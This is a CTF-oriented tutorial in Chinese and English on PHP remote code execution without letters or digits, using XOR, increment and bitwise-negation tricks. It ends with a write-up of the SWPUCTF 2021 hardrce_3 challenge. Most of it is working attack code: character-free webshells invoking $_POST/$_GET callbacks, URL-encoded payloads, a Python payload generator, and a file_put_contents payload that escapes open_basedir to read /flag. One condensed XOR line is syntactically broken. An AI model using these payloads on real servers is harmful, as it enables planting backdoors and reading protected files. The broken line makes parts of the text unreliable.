### 无参RCE|无字符RCE|openbasedir()

###### 一.Main contents

The rce with no arguments or no assci character is often a quzz that appear in competition,so I wrote this page to simply describle the simple build of self-increasing-code(自增马)and use an example to explain the RCE.

#### Part 1  '^'

Mainly rely on a special caculation  using '~' ,'^','&'

```ep
<?php                        |Output:          |That prove php auto do the                                    |                 |caculate . 
echo 'A'^'?';                | ~               |
```

  To the extent,we try to create a  payload that leave back door 

``` add
$__=("#"^"|"); // _
$__.=("."^"~"); // _P
$__.=("/"^"`"); // _PO
$__.=("|"^"/"); // _POS
$__.=("{"^"/"); // _POST 
$$__[_]($$__[__]); // $_POST[_]($_POST[__]);
```

 delete '\n' then we get :

```
$__=("#"^"|");$__.=("."^"~");$__.=("/"^"`");$__.=("|"^"/");$__.=({"^"/");$$__[_]($$__[__]);// $_POST[_]($_POST[__]);
```

use any tools to url encode,for the center equipment decode them once,we get 

```python
%24__%3D%28%22%23%22%5E%22%7C%22%29%3B%24__.%3D%28%22.%22%5E%22%7E%22%29%3B%24__.%3D%28%22/%22%5E%22%60%22%29%3B%24__.%3D%28%22%7C%22%5E%22/%22%29%3B%24__.%3D%28%7B%22%5E%22/%22%29%3B%24%24__%5B_%5D%28%24%24__%5B__%5D%29%3B//%20%24_POST%5B_%5D%28%24_POST%5B__%5D%29%3B
```

有同学就要问了，你的无参RCE是强，但是一个一个找太麻烦了，有没有更简单更无脑的办法了？有的有的，以下是借鉴（copy）的脚本

```python
import re
import requests
import urllib
from sys import *
import os

a=[]
ans1="" 
ans2=""
for i in range(0,256): #设置i的范围
    c=chr(i)
    #将i转换成ascii对应的字符，并赋值给c
    tmp = re.match(r'[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-',c,re.I)
    #设置过滤条件，让变量c在其中找对应，并利用修饰符过滤大小写，这样可以得到未被过滤的字符
    if(tmp):
        continue
        #当执行正确时，那说明这些是被过滤掉的，所以才会被匹配到，此时我们让他继续执行即可
    else:
        a.append(i)
        #在数组中增加i，这些就是未被系统过滤掉的字符

# eval("echo($c);");
mya="system"  #函数名 这里修改！
myb="dir"      #参数
def myfun(k,my): #自定义函数
    global ans1 #引用全局变量ans1，使得在局部对其进行更改时不会报错
    global ans2 #引用全局变量ans2，使得在局部对其进行更改时不会报错
    for i in range (0,len(a)): #设置循环范围为（0，a）注：a为未被过滤的字符数量 
        for j in range(i,len(a)): #在上个循环的条件下设置j的范围
            if(a[i]^a[j]==ord(my[k])):
                ans1+=chr(a[i]) #ans1=ans1+chr(a[i])
                ans2+=chr(a[j]) #ans2=ans2+chr(a[j])
                return;#返回循环语句中，重新寻找第二个k，这里的话就是寻找y对应的两个字符
for x in range(0,len(mya)): #设置k的范围
    myfun(x,mya)#引用自定义的函数
data1="('"+urllib.request.quote(ans1)+"'^'"+urllib.request.quote(ans2)+"')" #data1等于传入的命令,"+ans1+"是固定格式，这样可以得到变量对应的值，再用'包裹，这样是变量的固定格式，另一个也是如此，两个在进行URL编码后进行按位与运算，然后得到对应值
print(data1)
ans1=""#对ans1进行重新赋值
ans2=""#对ans2进行重新赋值
for k in range(0,len(myb)):#设置k的范围为(0,len(myb))
    myfun(k,myb)#再次引用自定义函数
data2="(\""+urllib.request.quote(ans1)+"\"^\""+urllib.request.quote(ans2)+"\")"
print(data2)
```

### 自增

https://www.php.net/manual/zh/language.operators.increment.php当我们通过某种方法可以得到一个字符时，我们就可以通过自增来获取其他字符，比如现在我们获取到了=A，我们进行_++，此时

代码语言：javascript

代码运行次数：0

运行

AI代码解释



```javascript
<?php
highlight_file(__FILE__);
$code = $_POST['code'];
if(preg_match("/[A-Za-z0-9]+/",$code)){
    die("hacker!");
}
@eval($code);
?>
```

我们首先可以写一个`[]`看一下

代码语言：javascript

代码运行次数：0

运行

AI代码解释



```javascript
<?php
$_=[];
var_dump($_);
```

![img](https://developer.qcloudimg.com/http-save/yehe-9691112/01900aad19d29cf3136eab6aa0fac6f5.png)

这个时候的话可以看到它就是一个数组，我们无法获取它的这个`Array`字符，那我们该怎么获取呢，我们尝试拼接一个数字

代码语言：javascript

代码运行次数：0

运行

AI代码解释



```javascript
<?php
$_=[].'1';
var_dump($_);
```

![img](https://developer.qcloudimg.com/http-save/yehe-9691112/09ea29b923889f4b8983ff0bd7c0cd27.png)

这里看到输出的是`Array1`，我们这里是不允许出现数字的，但我们直接拼接个空是不是也是可行的呢，尝试一下

代码语言：javascript

代码运行次数：0

运行

AI代码解释



```javascript
<?php
$_=[].'';
var_dump($_);
```

成功获取到了字符Array，然后我们获取想获取A的话，就可以采用[0]这种方式来获取，但我们是不能够写数字的，所以我们这里可以用一个判断,比如我们在[]里加一个==，此时因为空和不同，它就会输出0，此时也就等同于_[0]，具体实现代码如下

代码语言：javascript

代码运行次数：0

运行

AI代码解释



```javascript
<?php
$_=[];
$_=$_[''=='$'];
echo $_;
```

![img](https://developer.qcloudimg.com/http-save/yehe-9691112/b3732ad01635e37f147f6e6dde4c6c77.png)

此时成功获取到了字符`A`，有了`A`，我们就可以通过自增依次获取其他字符，我们尝试获取一个字符`G`

代码语言：javascript

代码运行次数：0

运行

AI代码解释



```javascript
<?php
$_=[];//Array
$_=$_[''=='$'];//A
$_++;//B
$_++;//C
$_++;//D
$_++;//E
$_++;//F
$_++;//G
var_dump($_);
```

然后看我们这里的代码的话，是eval(code)，所以我们就可以构造这种的_GET[1](

代码语言：javascript

代码运行次数：0

运行

AI代码解释



```javascript
<?php
$_=[].'';//Array
$_=$_[''=='$'];//A
$_++;//B
$_++;//C
$_++;//D
$_++;//E
$__=$_;//E
$_++;//F
$_++;//G
$___=$_;//G
$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;//T
$_=$___.$__.$_;//GET
//var_dump($_);
$_='_'.$_;//_GET
var_dump($$_[_]($$_[__]));
//$_GET[_]($_GET[__])
```

接下来就可以尝试去给`_`和`__`GET传参，这里我们需要把换行的都去掉，然后进行一次URL编码，因为中间件会解码一次，所以我们构造的payload先变成这样

代码语言：javascript

代码运行次数：0

运行

AI代码解释



```javascript
$_=[].'';$_=$_[''=='$'];$_++;$_++;$_++;$_++;$__=$_;$_++;$_++;$___=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_=$___.$__.$_;$_='_'.$_;$$_[_]($$_[__]);
```

而后变成

代码语言：javascript

代码运行次数：0

运行

AI代码解释



```javascript
%24_%3D%5B%5D.''%3B%24_%3D%24_%5B''%3D%3D'%24'%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24___%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24___.%24__.%24_%3B%24_%3D'_'.%24_%3B%24%24_%5B_%5D(%24%24_%5B__%5D)%3B
```

此时去尝试赋值

![img](https://developer.qcloudimg.com/http-save/yehe-9691112/7e0a7ef74b938c93a0f76ed938a91f36.png)

成功执行了命令，输出了当前目录

### 取反

这个的话我们这里其实是利用了不可见字符，我们对一个字符进行两次取反，得到的还是其本身。当我们进行一次取反过后，对其进行URL编码，再对其进行取反，此时可以得到可见的字符，它的本质其实还是这个字符本身，然后因为取反用的多是不可见字符，所以这里就达到了一种绕过的目的。

这里的话利用一个php脚本即可获取我们想要的字符

代码语言：javascript

代码运行次数：0

运行

AI代码解释



```javascript
<?php
$ans1='system';//函数名
$ans2='dir';//命令
$data1=('~'.urlencode(~$ans1));//通过两次取反运算得到system
$data2=('~'.urlencode(~$ans2));//通过两次取反运算得到dir
echo ('('.$data1.')'.'('.$data2.')'.';');
```

![img](https://developer.qcloudimg.com/http-save/yehe-9691112/40bbb583bca3102f9c0dccc02158accd.png)

接下来为例尝试一下

代码语言：javascript

代码运行次数：0

运行

AI代码解释



```javascript
<?php
highlight_file(__FILE__);
$code = $_GET['code'];
if(preg_match("/[a-zA-Z0-9]/",$code)){
    die("hacker!");
}
eval($code);
?>
```

![img](https://developer.qcloudimg.com/http-save/yehe-9691112/ebcb70269834604b98a9ee7b544e06ea.png)

## PART 2.关于自增的一些知识点

### 知识点1

在自增中，可以通过特殊字符构造出字符串的有以下几种方式

代码语言：javascript

代码运行次数：0

运行

AI代码解释



```javascript
[].''  //Array
(0/0).''   //NAN
(1/0).''   //INF
```

这个时候就有一个问题了，如果ban了数字，我们该怎么去构造`NAN`和`INF`呢，这个时候就需要讲到一个知识点，我们这里的话需要说一下这个`NAN`和`INF`

代码语言：javascript

代码运行次数：0

运行

AI代码解释



```javascript
NaN（Not a Number，非数）是计算机科学中数值数据类型的一类值，表示未定义或不可表示的值。常在浮点数运算中使用。首次引入NaN的是1985年的IEEE 754浮点数标准。

INF：infinite，表示“无穷大”。 超出浮点数的表示范围（溢出，即阶码部分超过其能表示的最大值）。
```

这里可以看出`NAN`表示的是未被定义的值，所以我们这里可以通过`a/a`这种方式构造，如果字母也被ban，我们也可以借助其他字符，比如`_/_`，这个时候也可以得到`NAN`，同理，`INF`也可以通过`1/a`的方式获取。

### 知识点2 

> ​         这里需要说明一下，笔者小白，对这个不太了解，然后可能这并不算什么知识点，还请各位大师傅多多担待

我们在构造POST中的时，正常操作的话是这样，a='_'.b(假设这里b就是POST)，然后这个时候如果'被ban，看似这里是无法再利用了，但其实，我们直接写a=.b也是可以的，这个时候效果同上而且缩短了字符长度。

## 补题

其实我还是想来讲讲nss的这一道题：RCE写码后无法任意读文件如何绕过获得权限

#### [SWPUCTF 2021 新生赛]hardrce_3

``` php
<?php
header("Content-Type:text/html;charset=utf-8");
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['wllm']))
{
    $wllm = $_GET['wllm'];
    $blacklist = [' ','\^','\~','\|'];
    foreach ($blacklist as $blackitem)
    {
        if (preg_match('/' . $blackitem . '/m', $wllm)) {
        die("小伙子只会异或和取反？不好意思哦LTLT说不能用！！");
    }}
if(preg_match('/[a-zA-Z0-9]/is',$wllm))
{
    die("Ra'sAlGhul说用字母数字是没有灵魂的！");
}
echo "NoVic4说：不错哦小伙子，可你能拿到flag吗？";
eval($wllm);
}
else
{
    echo "蔡总说：注意审题！！！";
}
?> 蔡总说：注意审题！！！
```

过滤了'^'字符，只可自增，尝试构造自增马：

`%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B%27!%27%3D%3D%27%40%27%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D%27_%27%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B`

与POST配合

```POST
_=eval($_POST['xxx'])&xxx
```

蚁剑连接，发现无权限，那么我们只好用这：

```
_=file_put_contents('1.php',"<?php print_r(ini_get('open_basedir').'<br>'); mkdir('test'); chdir('test'); ini_set('open_basedir','..'); chdir('..'); chdir('..'); chdir('..'); ini_set('open_basedir','/'); echo file_get_contents('/flag'); print(1);?> ");
```

直接访问1.php成功绕过